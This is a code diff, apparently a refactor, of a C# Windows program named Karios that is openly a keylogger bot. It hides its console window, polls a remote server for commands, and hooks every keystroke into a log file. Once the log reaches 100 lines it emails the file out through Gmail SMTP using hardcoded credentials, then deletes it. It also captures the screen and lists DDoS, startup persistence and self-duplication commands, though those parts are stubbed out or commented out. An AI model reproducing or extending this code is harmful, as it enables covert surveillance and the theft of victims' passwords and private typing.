@@ -22,22 +22,22 @@ namespace Karios
         private const int WH_KEYBOARD_LL = 13;
         private const int WM_KEYDOWN = 0x0100;
         private static LowLevelKeyboardProc _proc = HookCallback;
-        private static IntPtr _hookID = IntPtr.Zero;
-        private static string LocalIP;
-        private static string GlobalTargetIP;
-        private static string Website;
-        private static bool Online = false;
-        public static string commands = "";
+        private static IntPtr _hookId = IntPtr.Zero;
+        private static string _localIp;
+        private static string _globalTargetIp;
+        private static string _website;
+        private static bool _online = false;
+        public static string Commands = "";
 
         public static void Main()
         {
-            
+
             Console.WriteLine("Starting commandget");
             Console.ReadKey();
             CommandGet();
             Console.WriteLine("Finished commandget");
             Console.ReadKey();
-            if (Online == true)
+            if (_online)
             {
                 Console.WriteLine("Online does equal true");
                 Console.ReadKey();
@@ -48,10 +48,10 @@ namespace Karios
                 // SetStartup();
                 // Start Application
                 var handle = GetConsoleWindow();
-                ShowWindow(handle, SW_HIDE);
-                _hookID = SetHook(_proc);
+                ShowWindow(handle, SwHide);
+                _hookId = SetHook(_proc);
                 Application.Run();
-                UnhookWindowsHookEx(_hookID);
+                UnhookWindowsHookEx(_hookId);
             }
             Console.WriteLine("IF Statement did not work... exiting");
             Console.ReadKey();
@@ -59,10 +59,10 @@ namespace Karios
 
         public static void RunApplication()
         {
-           
+
 
             // Hide the window
-            
+
 
             // Persitance feature
             // Duplicate(); 
@@ -70,7 +70,7 @@ namespace Karios
             // Run on startup 
             // SetStartup();
             // Start Application
-            
+
             //Application.Run();
             //UnhookWindowsHookEx(_hookID);
         }
@@ -79,48 +79,47 @@ namespace Karios
         {
             try
             {
-                string ServerAddress = "http://cutenesss.xyz/server.php";
+                var serverAddress = "http://cutenesss.xyz/server.php";
 
-                WebClient client = new WebClient();
+                var client = new WebClient();
 
-                string Secret = "<3"; //A string to use as the version ID. Use it for testing the client.
+                var secret = "<3"; //A string to use as the version ID. Use it for testing the client.
 
 
                 //In future versions, this hash will be secret and enforced - Makes sure everyone is running latest client
-                int GetIterations = -1;
-                string target = "";
-                bool Loop = true; // So we can break the loop
-                while (Loop == true)
+                var getIterations = -1;
+                var target = "";
+                var loop = true; // So we can break the loop
+                while (loop)
                 {
-                    if (GetIterations == -1 || (target != "" && GetIterations > 9) || target == "")
+                    if (getIterations != -1 && (target == "" || getIterations <= 9) && target != "") continue;
+                    //Log("Asking the server for commands");
+                    var paramaters = "?";
+
+                    //Tells the server that this is a client, and not a web browser
+                    if (paramaters == "?")
+                        paramaters = paramaters + "isclient=true";
+                    else
+                        paramaters = paramaters + "&isclient=true";
+
+                    //Analytical: Tells server this is a new client
+                    //(Will probably be implemented in a newer version)
+                    if (getIterations == -1)
                     {
-                        //Log("Asking the server for commands");
-                        string paramaters = "?";
-
-                        //Tells the server that this is a client, and not a web browser
+                        //Telling the server this is a new client
                         if (paramaters == "?")
-                            paramaters = paramaters + "isclient=true";
+                            paramaters = paramaters + "newclient=true";
                         else
-                            paramaters = paramaters + "&isclient=true";
-
-                        //Analytical: Tells server this is a new client
-                        //(Will probably be implemented in a newer version)
-                        if (GetIterations == -1)
-                        {
-                            //Telling the server this is a new client
-                            if (paramaters == "?")
-                                paramaters = paramaters + "newclient=true";
-                            else
-                                paramaters = paramaters + "&newclient=true";
-                        }
+                            paramaters = paramaters + "&newclient=true";
+                    }
+                    else
+                    {
+                        if (paramaters == "?")
+                            paramaters = paramaters + "newclient=false";
                         else
-                        {
-                            if (paramaters == "?")
-                                paramaters = paramaters + "newclient=false";
-                            else
-                                paramaters = paramaters + "&newclient=false";
-                        }
-                        /*
+                            paramaters = paramaters + "&newclient=false";
+                    }
+                    /*
                         // 1 = DDOSOnline
                         if (paramaters == "?")
                             paramaters = paramaters + "ddosonline=true";
@@ -176,37 +175,38 @@ namespace Karios
                             paramaters = paramaters + "&reverse=false";
                         */
 
-                        string commands = "";
-                        try
-                        {
-                            commands = client.DownloadString(ServerAddress + paramaters);
-                        }
-                        catch (WebException)
-                        { }//TODO: Handle this Exception.
-                        string[] PreppedCommand = commands.Split(' ');
-                        /// <summary>
-                        /// COMMANDS : IMPORTAINT : 
-                        /// 0 = Online 
-                        /// 1 = DDOSOnline
-                        /// 2 = DDOSIP
-                        /// 3 = KeyloggerOnline
-                        /// 4 = Keylogger email
-                        /// 5 = Capture screen
-                        /// 6 = Startup
-                        /// 7  = Duplication
-                        /// 8 = Reverse everything
-                        /// </summary>
+                    var commands = "";
+                    try
+                    {
+                        commands = client.DownloadString(serverAddress + paramaters);
+                    }
+                    catch (WebException)
+                    { }//TODO: Handle this Exception.
+                    var preppedCommand = commands.Split(' ');
+#pragma warning disable 1587
+                    /// <summary>
+                    /// COMMANDS : IMPORTANT : 
+                    /// 0 = Online 
+                    /// 1 = DDOSOnline
+                    /// 2 = DDOSIP
+                    /// 3 = KeyloggerOnline
+                    /// 4 = Keylogger email
+                    /// 5 = Capture screen
+                    /// 6 = Startup
+                    /// 7  = Duplication
+                    /// 8 = Reverse everything
+                    /// </summary>
+#pragma warning restore 1587
 
-                        if (PreppedCommand[0] == "Online=True")
-                        {
-                            Online = true;
-                        }
-                        else
-                        {
-                            //Online = false;
-                        }
-                        Loop = false;
-                    }   
+                    if (preppedCommand[0] == "Online=True")
+                    {
+                        _online = true;
+                    }
+                    else
+                    {
+                        //Online = false;
+                    }
+                    loop = false;
                 }
             }
             catch { }
@@ -214,8 +214,8 @@ namespace Karios
 
         private static IntPtr SetHook(LowLevelKeyboardProc proc)
         {
-            using (Process curProcess = Process.GetCurrentProcess())
-            using (ProcessModule curModule = curProcess.MainModule)
+            using (var curProcess = Process.GetCurrentProcess())
+            using (var curModule = curProcess.MainModule)
             {
                 return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                     GetModuleHandle(curModule.ModuleName), 0);
@@ -226,55 +226,53 @@ namespace Karios
 
         private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
         {
-            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
+            if (nCode < 0 || wParam != (IntPtr)WM_KEYDOWN) return CallNextHookEx(_hookId, nCode, wParam, lParam);
+            var appName = AppDomain.CurrentDomain.FriendlyName;
+            var vkCode = Marshal.ReadInt32(lParam);
+            var fileName = DateTime.Now.ToString("yyyy-MM-dd");
+            // StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
+            var pathToLog = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\" +
+                            fileName + ".txt";// TODO - get more secret location.
+            var sw = new StreamWriter(pathToLog, true);
+            if ((Keys)vkCode != Keys.Space && (Keys)vkCode != Keys.Enter)
             {
-                string appName = AppDomain.CurrentDomain.FriendlyName;
-                int vkCode = Marshal.ReadInt32(lParam);
-                string fileName = DateTime.Now.ToString("yyyy-MM-dd");
-                // StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
-                string pathToLog = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\" +
-                fileName + ".txt";// TODO - get more secret location.
-                StreamWriter sw = new StreamWriter(pathToLog, true);
-                if ((Keys)vkCode != Keys.Space && (Keys)vkCode != Keys.Enter)
-                {
-                    sw.Write(((Keys)vkCode).ToString().ToLower());
-                    Console.Write(((Keys)vkCode).ToString().ToLower());
-                }
-                else
-                {
-                    sw.WriteLine("");
-                    sw.WriteLine((Keys)vkCode);
-                    Console.WriteLine((Keys)vkCode);
-                }
-                sw.Close();
+                sw.Write(((Keys)vkCode).ToString().ToLower());
+                Console.Write(((Keys)vkCode).ToString().ToLower());
+            }
+            else
+            {
+                sw.WriteLine("");
+                sw.WriteLine((Keys)vkCode);
+                Console.WriteLine((Keys)vkCode);
+            }
+            sw.Close();
 
-                if (File.ReadAllLines(pathToLog).Length > 100)
-                {
-                    try
-                    {
-                        var mail = new MailMessage();
-                        var SmtpServer = new SmtpClient("smtp.gmail.com"); // VSCode is suggesting another library, "MimeKit" - should be on GitHub if you want to check it out at https://github.com/jstedfast/MimeKit. It may need us to rewrite some code if we do implement it though -- STBoyden
-                        mail.From = new MailAddress("GINGIRULES@gmail.com");
-                        mail.To.Add("GINGIRULES@gmail.com");
-                        mail.Subject = "log from keylogger on" + Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
-                        mail.Body = "New log file from Computer (" + GetLocalIP(LocalIP)+ " , finshed at: " + DateTime.Now.ToString("yyyy-MM-dd");
-                        Attachment attachment;
-                        attachment = new Attachment(pathToLog);
-                        mail.Attachments.Add(attachment);
-                        SmtpServer.Port = 587;
-                        SmtpServer.Credentials = new NetworkCredential("GINGIRULES@gmail.com", "G1ng1RuleS");
-                        SmtpServer.EnableSsl = true;
-                        SmtpServer.Send(mail);
-                        //clear mail attachment
-                        attachment.Dispose();
-                        //copy program to an new destination
-                    }
-                    catch { }
+            if (File.ReadAllLines(pathToLog).Length <= 100) return CallNextHookEx(_hookId, nCode, wParam, lParam);
+            try
+            {
+                var mail = new MailMessage();
+                var smtpServer = new SmtpClient("smtp.gmail.com"); // VSCode is suggesting another library, "MimeKit" - should be on GitHub if you want to check it out at https://github.com/jstedfast/MimeKit. It may need us to rewrite some code if we do implement it though -- STBoyden
+                mail.From = new MailAddress("GINGIRULES@gmail.com");
+                mail.To.Add("GINGIRULES@gmail.com");
+                mail.Subject = "log from keylogger on" + Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
+                mail.Body = "New log file from Computer (" + GetLocalIp(_localIp) + " , finshed at: " + DateTime.Now.ToString("yyyy-MM-dd");
+                Attachment attachment;
+                attachment = new Attachment(pathToLog);
+                mail.Attachments.Add(attachment);
+                smtpServer.Port = 587;
+                smtpServer.Credentials = new NetworkCredential("GINGIRULES@gmail.com", "G1ng1RuleS");
+                smtpServer.EnableSsl = true;
+                smtpServer.Send(mail);
+                //clear mail attachment
+                attachment.Dispose();
+                //copy program to an new destination
+            }
+            catch { }
 
-                    //System.IO.File.Copy(path, Application.StartupPath + @"\log.txt", true);
-                    DriveInfo[] alldrives = DriveInfo.GetDrives();
+            //System.IO.File.Copy(path, Application.StartupPath + @"\log.txt", true);
+            var alldrives = DriveInfo.GetDrives();
 
-                    /*
+            /*
                     foreach (DriveInfo d in alldrives)
                     {
                         if (d.DriveType == DriveType.Removable && d.IsReady)
@@ -284,19 +282,15 @@ namespace Karios
                         }
                     }
                     */
-                    //delete log file.
-                    File.Delete(pathToLog);
-
-                }
-
-            }
-            return CallNextHookEx(_hookID, nCode, wParam, lParam);
+            //delete log file.
+            File.Delete(pathToLog);
+            return CallNextHookEx(_hookId, nCode, wParam, lParam);
         }
         /// <summary>
         /// Sets the startup registary key
         /// </summary>
 
-        
+
         public static void SetStartup()
         {
             /*
@@ -320,18 +314,18 @@ namespace Karios
             }
             */
         }
-        
 
-        public static string GetLocalIP(string LocalIP)
+
+        public static string GetLocalIp(string localIp)
         {
-            using (Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, 0))
+            using (var socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, 0))
             {
                 try
                 {
                     socket.Connect("8.8.8.8", 65530);
-                    IPEndPoint endPoint = socket.LocalEndPoint as IPEndPoint;
-                    LocalIP = endPoint.Address.ToString();
-                    return LocalIP;
+                    var endPoint = socket.LocalEndPoint as IPEndPoint;
+                    if (endPoint != null) localIp = endPoint.Address.ToString();
+                    return localIp;
                 }
                 finally
                 {
@@ -342,24 +336,24 @@ namespace Karios
 
         public static void LaunchWebsite()
         {
-            using (WebClient wc = new WebClient())
+            using (var wc = new WebClient())
             {
                 try
                 {
-     
+
                 }
                 catch { }
             }
         }
 
-        public static void DDOS()
+        public static void Ddos()
         {
-            using (WebClient wc = new WebClient())
+            using (var wc = new WebClient())
             {
                 try
                 {
-                   
-                  
+
+
                 }
                 catch { }
             }
@@ -367,10 +361,9 @@ namespace Karios
 
         private static Image CaptureDesktop()
         {
-            Rectangle rectangle = default(Rectangle);
-            rectangle = Screen.PrimaryScreen.Bounds;
-            Bitmap bitmap = new Bitmap(rectangle.Width, rectangle.Height, PixelFormat.Format32bppArgb);
-            Graphics graphics = Graphics.FromImage(bitmap);
+            var rectangle = Screen.PrimaryScreen.Bounds;
+            var bitmap = new Bitmap(rectangle.Width, rectangle.Height, PixelFormat.Format32bppArgb);
+            var graphics = Graphics.FromImage(bitmap);
             graphics.CopyFromScreen(rectangle.X, rectangle.Y, 0, 0, rectangle.Size, CopyPixelOperation.SourceCopy);
             return bitmap;
         }
@@ -394,8 +387,8 @@ namespace Karios
         static extern IntPtr GetConsoleWindow();
 
         [DllImport("user32.dll")]
-        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 
-        const int SW_HIDE = 0;
+        private const int SwHide = 0;
     }
 }
